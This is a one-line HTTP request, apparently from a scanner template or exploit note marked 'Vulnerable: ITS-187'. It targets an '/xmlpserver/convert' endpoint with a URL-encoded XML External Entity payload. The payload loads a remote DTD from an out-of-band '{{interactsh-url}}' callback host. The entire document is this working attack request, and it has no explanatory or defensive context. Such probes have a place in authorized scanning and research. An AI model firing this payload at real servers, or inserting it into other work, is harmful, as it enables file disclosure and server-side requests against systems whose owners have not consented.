# Vulnerable: ITS-187
GET /xmlpserver/convert?xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//{{interactsh-url}}/xxe.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123
